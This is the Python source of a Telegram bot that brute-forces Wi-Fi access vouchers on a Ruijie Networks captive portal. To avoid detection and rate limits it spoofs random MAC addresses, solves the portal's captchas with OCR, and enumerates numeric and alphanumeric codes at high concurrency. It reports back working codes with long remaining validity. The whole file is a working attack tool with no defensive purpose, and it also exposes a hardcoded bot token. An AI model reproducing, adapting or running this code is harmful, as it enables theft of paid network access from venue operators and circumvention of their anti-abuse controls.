import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import cv2
import ddddocr
import numpy as np
from telebot.async_telebot import AsyncTeleBot

# --- Configuration ---
BOT_TOKEN = '8787313848:AAGwamfL8dEnm2zWONivqtkuRvBLeWWBc3k'

bot = AsyncTeleBot(BOT_TOKEN)

# Global State
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
retry_counts = {}
_connector = None
CONCURRENCY = 100
_voucher_sem = None
_ocr = ddddocr.DdddOcr(show_ad=False)

# --- URL Verification & Helper Functions ---

async def check_session_url(session_url):
    if "sessionId" in session_url:
        return True

    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, timeout=15) as response:
                final_url = str(response.url)
                if response.status == 200:
                    return True
                if "sessionId" in final_url:
                    return True
                return False
    except Exception as e:
        print(f"[Debug] Connection Error: {e}")
        if session_url.startswith("http"):
            return True
        return False

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return session_id.group(1) if session_id else previous_session_id
    except:
        return previous_session_id

# --- OCR & Captcha Functions ---

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
            return await req.read()
    except: return None

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except: return None

# --- Expire Time Functions ---

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

def should_show_code(total_minutes):
    if total_minutes == 'Unknown':
        return True
    mins = int(total_minutes)
    return mins == 0 or mins >= 1440

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                raw_minutes = respond.get('result', {}).get('totalMinutes', 'Unknown')
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(raw_minutes)
                display = f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
                return display, raw_minutes
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

# --- Generators & Formatting ---

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def iter_codes(mode, prefix=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if prefix is not None:
            if not prefix.isdigit():
                raise ValueError("Prefix must be digits only (e.g. 1, 55)")
            prefix_len = len(prefix)
            if prefix_len >= length:
                raise ValueError(f"Prefix length must be less than {length}")
            start = int(prefix) * (10 ** (length - prefix_len))
            end = (int(prefix) + 1) * (10 ** (length - prefix_len))
            codes = [str(i).zfill(length) for i in range(start, end)]
            random.shuffle(codes)
            yield from codes
            return
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
        elif mode == "8":
            while True: yield digit_generator(8)
    elif mode == "ascii-lower":
        while True: yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    elif mode == "all":
        while True: yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    else:
        raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total:
        percent = (checked / total) * 100
        bar = "█" * int(percent / 5) + "░" * (20 - int(percent / 5))
        return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Found : {found}\n🔁Retry : {retries}\n[{bar}]"
    return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Found : {found}\n🔁Retry : {retries}\n📊Status : running\n"

# --- Scanning Logic ---

BATCH_SIZE = 300

async def perform_check(session_url, code, chat_id, scan_id, message=None):
    current_task = scan_tasks.get(chat_id)
    if not current_task or current_task.get("scan_id") != scan_id:
        return

    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"

    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            # Code တစ်ခုစီ session + captcha အသစ်တစ်ခုစီ (sleep မပါ)
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    if not image:
                        continue
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if 'request limited' in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        await handle_success(chat_id, code, session_id, message)
    elif 'STA' in response:
        await handle_limited(chat_id, code, session_id, message)

async def handle_success(chat_id, code, session_id, message):
    expire_info, raw_minutes = await Code_Expires_Date(session_id)

    if not should_show_code(raw_minutes):
        print(f"[filter] Skipped success code {code} — totalMinutes={raw_minutes} (< 1 day)")
        return

    if chat_id not in success_texts:
        success_texts[chat_id] = []
    entry = f"🎫 {code}\n   {expire_info}"
    if entry not in success_texts[chat_id]:
        success_texts[chat_id].append(entry)
        text = "✅ Success Codes:\n\n" + "\n\n".join(success_texts[chat_id])
        if chat_id not in success_messages:
            sent = await bot.send_message(chat_id, text)
            success_messages[chat_id] = sent.message_id
        else:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=text)
            except:
                sent = await bot.send_message(chat_id, text)
                success_messages[chat_id] = sent.message_id

async def handle_limited(chat_id, code, session_id, message):
    expire_info, raw_minutes = await Code_Expires_Date(session_id)

    if not should_show_code(raw_minutes):
        print(f"[filter] Skipped limited code {code} — totalMinutes={raw_minutes} (< 1 day)")
        return

    if chat_id not in limited_texts:
        limited_texts[chat_id] = []
    entry = f"⚠️ {code}\n   {expire_info}"
    if entry not in limited_texts[chat_id]:
        limited_texts[chat_id].append(entry)
        text = "⚠️ Limited Codes:\n\n" + "\n\n".join(limited_texts[chat_id])
        if chat_id not in limited_messages:
            sent = await bot.send_message(chat_id, text)
            limited_messages[chat_id] = sent.message_id
        else:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=text)
            except:
                sent = await bot.send_message(chat_id, text)
                limited_messages[chat_id] = sent.message_id

async def run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg, prefix=None):
    try:
        try:
            code_iter = iter_codes(mode, prefix)
        except ValueError as e:
            await bot.send_message(chat_id, str(e))
            return

        if prefix and mode in ["6", "7", "8"]:
            total = 10 ** (int(mode) - len(prefix))
        else:
            total = 10 ** int(mode) if mode in ["6", "7"] else None

        checked = 0
        scan_start = time.monotonic()
        global _voucher_sem
        if _voucher_sem is None:
            _voucher_sem = asyncio.Semaphore(CONCURRENCY)

        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c, chat_id, scan_id, message)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=format_progress(checked, total, speed, found, retries)
                )
            except:
                pass

        final_found = len(success_texts.get(chat_id, []))
        final_retries = retry_counts.get(chat_id, 0)
        finish_text = (
            "🔍Scanning Completed\n\n"
            f"📦Checked : {checked:,}\n"
            f"✅Found : {final_found}\n"
            f"🔁Retry : {final_retries}\n"
            "📊Progress : 100%\n"
            "[████████████████████]"
        )
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
        except:
            await bot.send_message(chat_id, finish_text)

    finally:
        scan_tasks.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

# --- Bot Commands ---

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot started. Use /input <url> first, then /scan <mode>.")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /input <url>")
        return
    url = args[1].strip()
    status_msg = await bot.reply_to(message, "⏳ Checking URL...")
    if await check_session_url(url):
        user_data[message.chat.id] = {'session_url': url}
        await bot.edit_message_text("✅ Session URL saved. Use /scan <6, 7, 8, all, ascii-lower> to start.", message.chat.id, status_msg.message_id)
    else:
        await bot.edit_message_text("❌ Invalid Session URL.", message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['scan'])
async def scan(message):
    parts = message.text.split()
    if len(parts) < 2:
        await bot.reply_to(message, "Usage: /scan <6, 7, 8, all, ascii-lower> [prefix]\n\nExamples:\n/scan 6\n/scan 6 1  → 100000~199999\n/scan 6 55 → 550000~559999")
        return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Please use /input <url> first.")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan already running. Use /stop first.")
        return

    mode = parts[1]
    prefix = parts[2] if len(parts) > 2 else None
    progress_msg = await bot.send_message(chat_id, "🔍 Starting Scan...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg, prefix=prefix)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["stop"] = True
        scan_tasks[chat_id]["scan_id"] = None
        scan_tasks[chat_id]["task"].cancel()
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "⏹ Scan stopped.")
    else:
        await bot.reply_to(message, "No scan running.")

# --- Main ---

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=2000, ssl=False)
    print("Bot is starting...")
    try:
        await bot.polling(non_stop=True)
    finally:
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
